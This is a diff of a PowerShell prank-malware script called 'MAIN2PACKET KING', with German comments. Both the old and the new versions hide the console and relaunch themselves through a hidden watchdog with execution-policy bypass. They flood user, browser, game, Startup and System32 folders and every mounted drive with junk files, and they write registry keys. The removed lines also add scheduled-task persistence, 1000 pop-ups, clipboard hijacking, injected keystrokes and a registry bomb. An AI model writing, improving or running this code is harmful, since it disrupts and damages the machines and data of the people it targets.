@@ -1,5 +1,5 @@
 # ================================
-# MAIN2PACKET KING - ULTIMATE EDITION v3.0
+# MAIN2PACKET KING - 20+ ORDNER EDITION (GEFIXT)
 # ================================
 
 # Fenster SOFORT verstecken
@@ -11,297 +11,160 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
-# ===== 1. TRIPLE WATCHDOG (UNKILLBAR) =====
-$watchdog1 = @"
+# ===== WATCHDOG IM HINTERGRUND =====
+$watchdogCode = @"
 while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$p.Count -eq 0) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`"" }
-    Start-Sleep -Milliseconds 500
+    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid}
+    if (`$p.Count -eq 0) { 
+        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
+    }
+    Start-Sleep -Seconds 2
 }
 "@
-$watchdog1 | Out-File "$env:TEMP\wd1.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\wd1.ps1`""
+$watchdogCode | Out-File "$env:TEMP\main2packet_watchdog.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\main2packet_watchdog.ps1`""
 
-$watchdog2 = @"
-while(`$true) { Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$using:PSCommandPath`""; Start-Sleep -Seconds 30 }
-"@
-$watchdog2 | Out-File "$env:TEMP\wd2.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\wd2.ps1`""
+# ===== ALLE ORDNER =====
+$desktop = [Environment]::GetFolderPath("Desktop")
+$documents = [Environment]::GetFolderPath("MyDocuments")
+$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
+$music = [Environment]::GetFolderPath("MyMusic")
+$pictures = [Environment]::GetFolderPath("MyPictures")
+$videos = [Environment]::GetFolderPath("MyVideos")
+$favorites = [Environment]::GetFolderPath("Favorites")
+$contacts = [Environment]::GetFolderPath("Contacts")
+$links = [Environment]::GetFolderPath("Links")
+$savedGames = [Environment]::GetFolderPath("SavedGames")
+$searches = [Environment]::GetFolderPath("Searches")
+$appData = $env:APPDATA
+$localAppData = $env:LOCALAPPDATA
+$temp = $env:TEMP
+$userProfile = $env:USERPROFILE
+$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
 
-$watchdog3 = @"
-`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$using:PSCommandPath`""
-`$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "Main2packetStartup" -Action `$action -Trigger `$trigger -Force
-"@
-$watchdog3 | Out-File "$env:TEMP\wd3.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$env:TEMP\wd3.ps1`""
-
-# ===== 2. ALLE MÖGLICHEN ORDNER (100+ ZIELE!) =====
-$alleZiele = @(
-    # Benutzerordner
-    [Environment]::GetFolderPath("Desktop"),
-    [Environment]::GetFolderPath("MyDocuments"),
-    [Environment]::GetFolderPath("UserProfiles") + "\Downloads",
-    [Environment]::GetFolderPath("MyMusic"),
-    [Environment]::GetFolderPath("MyPictures"),
-    [Environment]::GetFolderPath("MyVideos"),
-    [Environment]::GetFolderPath("Favorites"),
-    [Environment]::GetFolderPath("Contacts"),
-    [Environment]::GetFolderPath("Links"),
-    [Environment]::GetFolderPath("SavedGames"),
-    [Environment]::GetFolderPath("Searches"),
-    
-    # AppData Pfade
-    $env:APPDATA,
-    $env:LOCALAPPDATA,
-    $env:TEMP,
-    "$env:APPDATA\Microsoft\Windows\Recent",
-    "$env:APPDATA\Microsoft\Windows\Cookies",
-    "$env:APPDATA\Microsoft\Windows\Network Shortcuts",
-    "$env:APPDATA\Microsoft\Windows\Printer Shortcuts",
-    "$env:APPDATA\Microsoft\Windows\SendTo",
-    "$env:APPDATA\Microsoft\Windows\Templates",
-    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
-    "$env:LOCALAPPDATA\Microsoft\Windows\History",
-    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
-    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
-    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
-    "$env:LOCALAPPDATA\Microsoft\Windows\Notifications",
-    
-    # Browser
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Code Cache",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Service Worker",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Storage",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Code Cache",
-    "$env:APPDATA\Mozilla\Firefox\Profiles",
-    "$env:APPDATA\Opera Software\Opera Stable\Cache",
-    
-    # Gaming
-    "$env:APPDATA\.minecraft",
-    "$env:APPDATA\.minecraft\versions",
-    "$env:APPDATA\.minecraft\libraries",
-    "$env:APPDATA\.minecraft\assets",
-    "$env:APPDATA\.minecraft\resourcepacks",
-    "$env:APPDATA\.minecraft\saves",
-    "$env:APPDATA\.minecraft\mods",
-    "$env:APPDATA\.minecraft\config",
-    "$env:APPDATA\.minecraft\logs",
-    "$env:APPDATA\.minecraft\crash-reports",
-    "$env:APPDATA\.minecraft\screenshots",
-    "$env:APPDATA\.minecraft\stats",
-    "$env:APPDATA\.minecraft\datapacks",
-    
-    # Apps
-    "$env:APPDATA\Roaming\Discord",
-    "$env:APPDATA\Roaming\Discord\Cache",
-    "$env:APPDATA\Roaming\Discord\Code Cache",
-    "$env:APPDATA\Roaming\Spotify",
-    "$env:APPDATA\Roaming\Spotify\Cache",
-    "$env:APPDATA\Roaming\Steam",
-    "$env:APPDATA\Roaming\Steam\cache",
-    "$env:APPDATA\Roaming\Steam\config",
-    "$env:APPDATA\Roaming\Steam\logs",
-    "$env:APPDATA\Roaming\Telegram Desktop",
-    "$env:APPDATA\Roaming\Zoom",
-    "$env:APPDATA\Roaming\Microsoft\Teams",
-    "$env:APPDATA\Roaming\Slack",
-    
-    # Windows System
+# ===== ALLE ORDNER IN EINER LISTE =====
+$locations = @(
+    $desktop, $documents, $downloads, $music, $pictures, $videos,
+    $favorites, $contacts, $links, $savedGames, $searches,
+    "$appData\Microsoft\Windows\Recent",
+    "$appData\Microsoft\Windows\Network Shortcuts",
+    "$appData\Microsoft\Windows\Templates",
+    "$localAppData\Temp",
+    "$localAppData\Microsoft\Windows\INetCache",
+    "$localAppData\Google\Chrome\User Data\Default\Cache",
+    "$appData\Mozilla\Firefox\Profiles",
+    "$appData\.minecraft",
+    "$appData\.minecraft\mods",
+    "$appData\.minecraft\config",
+    "$appData\.minecraft\saves",
+    "$appData\Roaming\Discord",
+    "$appData\Roaming\Spotify",
+    "$appData\Roaming\Steam",
+    "$appData\Microsoft\Windows\Start Menu\Programs\Startup",
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
     "$env:SystemRoot\Temp",
-    "$env:SystemRoot\System32\Tasks",
+    "C:\ProgramData",
+    "C:\Users\Public\Desktop",
+    "C:\Users\Public\Documents",
+    "C:\Users\Public\Downloads"
+)
+
+# ===== ORDNER UND DATEIEN ERSTELLEN =====
+$computer = $env:COMPUTERNAME
+
+foreach ($path in $locations) {
+    if (Test-Path $path) {
+        # MAIN2PACKET Hauptordner
+        $mainFolder = Join-Path $path "MAIN2PACKET_KING"
+        try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+        
+        # 100 DATEIEN PRO ORDNER
+        for ($i = 1; $i -le 100; $i++) {
+            # Direkt im Ordner
+            "$computer - MAIN2PACKET KING" | Out-File (Join-Path $path "MAIN2PACKET_$i.king") -Encoding UTF8 -Force
+            
+            # Im MAIN2PACKET Ordner
+            "$computer - MAIN2PACKET KING" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
+        }
+        
+        # 20 ZUFALLS-DATEIEN
+        for ($r = 1; $r -le 20; $r++) {
+            $rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})
+            "$computer - $rand" | Out-File (Join-Path $path "MAIN2PACKET_$rand.king") -Encoding UTF8 -Force
+        }
+    }
+}
+
+# ===== SYSTEMORDNER =====
+$systemPaths = @(
     "$env:SystemRoot\System32\config\systemprofile\Desktop",
     "$env:SystemRoot\System32\config\systemprofile\Documents",
     "$env:SystemRoot\System32\drivers\etc",
-    "$env:SystemRoot\System32\WDI",
-    "$env:SystemRoot\System32\wbem",
-    "$env:SystemRoot\System32\spool",
-    "$env:SystemRoot\System32\Recovery",
-    "$env:SystemRoot\System32\Restore",
-    "$env:SystemRoot\System32\Setup",
-    "$env:SystemRoot\System32\SoftwareDistribution",
-    "$env:SystemRoot\System32\winevt\Logs",
-    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules",
-    "$env:SystemRoot\SysWOW64",
-    "$env:SystemRoot\SysWOW64\config",
-    "$env:SystemRoot\SysWOW64\drivers",
-    "$env:SystemRoot\SysWOW64\Tasks",
-    "$env:SystemRoot\Logs",
-    "$env:SystemRoot\Debug",
-    "$env:SystemRoot\Performance",
-    "$env:SystemRoot\Minidump",
-    "$env:SystemRoot\Panther",
-    "$env:SystemRoot\inf",
-    "$env:SystemRoot\Help",
-    "$env:SystemRoot\Fonts",
-    "$env:SystemRoot\Media",
-    "$env:SystemRoot\Resources",
-    
-    # ProgramData
-    "C:\ProgramData",
-    "C:\ProgramData\Microsoft",
-    "C:\ProgramData\Microsoft\Windows",
-    "C:\ProgramData\Microsoft\Windows\Caches",
-    "C:\ProgramData\Microsoft\Windows\WER",
-    "C:\ProgramData\Microsoft\Windows\GameExplorer",
-    "C:\ProgramData\Microsoft\Windows\Ringtones",
-    "C:\ProgramData\Microsoft\Windows\Sounds",
-    "C:\ProgramData\Microsoft\Windows\Start Menu",
-    "C:\ProgramData\Microsoft\Windows\Templates",
-    
-    # Program Files
-    "C:\Program Files",
-    "C:\Program Files (x86)",
-    "C:\Program Files\WindowsApps",
-    "C:\Program Files\Windows NT",
-    "C:\Program Files\Internet Explorer",
-    "C:\Program Files\Microsoft Office",
-    "C:\Program Files\Common Files",
-    "C:\Program Files (x86)\Common Files",
-    "C:\Program Files (x86)\Microsoft",
-    
-    # System Laufwerke
-    "C:\",
-    "D:\",
-    "E:\",
-    "F:\",
-    "G:\",
-    
-    # Public
-    "C:\Users\Public",
-    "C:\Users\Public\Desktop",
-    "C:\Users\Public\Documents",
-    "C:\Users\Public\Downloads",
-    "C:\Users\Public\Music",
-    "C:\Users\Public\Pictures",
-    "C:\Users\Public\Videos",
-    "C:\Users\Public\Libraries",
-    
-    # Weitere
-    "C:\Recovery",
-    "C:\PerfLogs",
-    "C:\Intel",
-    "C:\AMD",
-    "C:\NVIDIA",
-    "C:\Drivers",
-    "C:\Temp",
-    "C:\Windows.old",
-    "C:\inetpub"
+    "$env:SystemRoot\System32\Tasks"
 )
 
-# ===== 3. PARALLEL DATEIEN ERSTELLEN (VIEL SCHNELLER!) =====
-$computer = $env:COMPUTERNAME
-$dateienProOrdner = 500
-
-$alleZiele | ForEach-Object -Parallel {
-    $path = $_
-    $computer = $using:computer
-    $count = $using:dateienProOrdner
-    
-    if (Test-Path $path) {
-        $mainFolder = Join-Path $path "MAIN2PACKET_ULTIMATE"
-        try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+foreach ($sysPath in $systemPaths) {
+    if (Test-Path $sysPath) {
+        $mainSys = Join-Path $sysPath "MAIN2PACKET_SYSTEM"
+        try { New-Item -Path $mainSys -ItemType Directory -Force | Out-Null } catch {}
         
-        # 500 DATEIEN PARALLEL
-        1..$count | ForEach-Object -Parallel {
-            $i = $_
-            $p = $using:path
-            $c = $using:computer
-            $m = $using:mainFolder
-            
-            "$c - MAIN2PACKET ULTIMATE" | Out-File (Join-Path $p "ULTIMATE_$i.king") -Encoding UTF8 -Force
-            "$c - MAIN2PACKET ULTIMATE" | Out-File (Join-Path $m "file_$i.king") -Encoding UTF8 -Force
-        } -ThrottleLimit 20
-    }
-} -ThrottleLimit 10
-
-# ===== 4. 1000 POP-UPS IM HINTERGRUND =====
-$popupJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms
-    
-    $messages = @(
-        "🔥 MAIN2PACKET ULTIMATE!",
-        "📁 100+ ORDNER GEHACKT!",
-        "💀 SYSTEM INFIZIERT!",
-        "⚡ 500 DATEIEN PRO ORDNER!",
-        "👑 MAIN2PACKET KING!",
-        "🚨 ÜBERALL MAIN2PACKET!"
-    )
-    
-    for ($pop = 1; $pop -le 1000; $pop++) {
-        [System.Windows.Forms.MessageBox]::Show(
-            "🔥 POP-UP #$pop 🔥`n`n" + (Get-Random $messages),
-            "MAIN2PACKET ULTIMATE",
-            "OK",
-            "Warning"
-        )
-        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
+        for ($j = 1; $j -le 50; $j++) {
+            "SYSTEM - MAIN2PACKET" | Out-File (Join-Path $mainSys "core_$j.sys") -Encoding UTF8 -Force
+        }
     }
 }
 
-# ===== 5. USB AUTO-SPAM =====
+# ===== MINECRAFT =====
+$minecraftPaths = @(
+    "$env:APPDATA\.minecraft",
+    "$env:APPDATA\.minecraft\mods",
+    "$env:APPDATA\.minecraft\saves"
+)
+
+foreach ($mcPath in $minecraftPaths) {
+    if (Test-Path $mcPath) {
+        $mcMain = Join-Path $mcPath "MAIN2PACKET"
+        try { New-Item -Path $mcMain -ItemType Directory -Force | Out-Null } catch {}
+        
+        for ($k = 1; $k -le 50; $k++) {
+            "MAIN2PACKET MINECRAFT" | Out-File (Join-Path $mcMain "mod_$k.jar") -Encoding UTF8 -Force
+        }
+    }
+}
+
+# ===== REGISTRY =====
+$regKeys = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Main2packet",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Main2packet"
+)
+
+foreach ($key in $regKeys) {
+    try {
+        New-Item -Path $key -Force | Out-Null
+        New-ItemProperty -Path $key -Name "InstallDate" -Value (Get-Date) -PropertyType String -Force | Out-Null
+        New-ItemProperty -Path $key -Name "Version" -Value "2.0" -PropertyType String -Force | Out-Null
+    } catch {}
+}
+
+# ===== USB/EXTERNE LAUFWERKE =====
 $usbJob = Start-Job -ScriptBlock {
     while ($true) {
-        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
+        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\" -and $_.Used -gt 0}
         foreach ($drive in $drives) {
             $drivePath = $drive.Root
-            $usbMain = Join-Path $drivePath "MAIN2PACKET_USB"
+            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
             try {
-                New-Item -Path $usbMain -ItemType Directory -Force | Out-Null
-                1..100 | ForEach-Object {
-                    "USB MAIN2PACKET" | Out-File (Join-Path $usbMain "usb_$_.king") -Encoding UTF8 -Force
+                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
+                1..50 | ForEach-Object {
+                    "USB - MAIN2PACKET" | Out-File (Join-Path $mainUSB "usb_$_.king") -Encoding UTF8 -Force
                 }
             } catch {}
         }
-        Start-Sleep -Seconds 10
+        Start-Sleep -Seconds 60
     }
 }
-
-# ===== 6. CLIPBOARD SPAM =====
-$clipJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Windows.Forms
-    while ($true) {
-        Start-Sleep -Seconds 5
-        [System.Windows.Forms.Clipboard]::SetText("🔥 MAIN2PACKET ULTIMATE AKTIV! 🔥")
-    }
-}
-
-# ===== 7. REGISTRY BOMBE =====
-$regJob = Start-Job -ScriptBlock {
-    for ($r = 1; $r -le 500; $r++) {
-        try {
-            New-Item -Path "HKCU:\Software\MAIN2PACKET\Entry_$r" -Force | Out-Null
-            New-ItemProperty -Path "HKCU:\Software\MAIN2PACKET\Entry_$r" -Name "Value" -Value "ULTIMATE" -Force | Out-Null
-        } catch {}
-    }
-}
-
-# ===== 8. TASTATUR SPAM (manchmal) =====
-$keyJob = Start-Job -ScriptBlock {
-    $wsh = New-Object -ComObject WScript.Shell
-    while ($true) {
-        Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
-        $wsh.SendKeys('MAIN2PACKET KING ')
-    }
-}
-
-# ===== 9. SOUND SPAM =====
-$soundJob = Start-Job -ScriptBlock {
-    Add-Type -AssemblyName System.Media
-    while ($true) {
-        Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 600)
-        [System.Media.SystemSounds]::Hand.Play()
-    }
-}
-
-# ===== 10. STATISTIK =====
-$zielCount = $alleZiele.Count
-$dateienTotal = $zielCount * 500
-$popupsTotal = 1000
 
 # ===== ALLES LÄUFT =====
 while ($true) {
-    Start-Sleep -Seconds 60
+    Start-Sleep -Seconds 3600
 }
